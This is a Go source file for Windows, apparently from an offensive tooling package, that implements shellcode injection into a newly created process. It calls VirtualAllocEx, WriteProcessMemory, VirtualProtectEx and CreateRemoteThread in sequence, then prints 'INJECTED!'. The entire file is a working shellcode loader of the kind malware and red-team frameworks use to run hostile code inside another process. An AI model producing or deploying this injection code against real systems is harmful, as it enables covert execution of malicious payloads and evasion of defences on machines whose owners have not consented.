// +build windows

package inject

import (
	"fmt"
	"log"
	"unsafe"

	"golang.org/x/sys/windows"
)

func CreateRemoteThread(shellcode []byte) {

	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	virtualAllocEx := kernel32.NewProc("VirtualAllocEx")
	virtualProtectEx := kernel32.NewProc("VirtualProtectEx")
	writeProcessMemory := kernel32.NewProc("WriteProcessMemory")
	createRemoteThread := kernel32.NewProc("CreateRemoteThread")
	closeHandle := kernel32.NewProc("CloseHandle")

	pi := CreateProcess()
	oldProtect := windows.PAGE_READWRITE

	lpBaseAddress, _, errVirtualAllocEx := virtualAllocEx.Call(uintptr(pi.Process), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
	if errVirtualAllocEx.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling VirtualAllocEx:\r\n%s", errVirtualAllocEx.Error()))
	}

	_, _, errWriteProcessMemory := writeProcessMemory.Call(uintptr(pi.Process), lpBaseAddress, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)), 0)
	if errWriteProcessMemory.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling WriteProcessMemory:\r\n%s", errWriteProcessMemory.Error()))
	}

	_, _, errVirtualProtectEx := virtualProtectEx.Call(uintptr(pi.Process), lpBaseAddress, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
	if errVirtualProtectEx.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling VirtualProtectEx:\r\n%s", errVirtualProtectEx.Error()))
	}

	_, _, errCreateRemoteThreadEx := createRemoteThread.Call(uintptr(pi.Process), 0, 0, lpBaseAddress, 0, 0, 0)
	if errCreateRemoteThreadEx.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling CreateRemoteThreadEx:\r\n%s", errCreateRemoteThreadEx.Error()))
	}

	_, _, errCloseHandle := closeHandle.Call(uintptr(pi.Process))
	if errCloseHandle.Error() != "The operation completed successfully." {
		log.Fatal(fmt.Sprintf("Error calling CloseHandle:\r\n%s", errCloseHandle.Error()))
	}

	fmt.Println("INJECTED!")
}
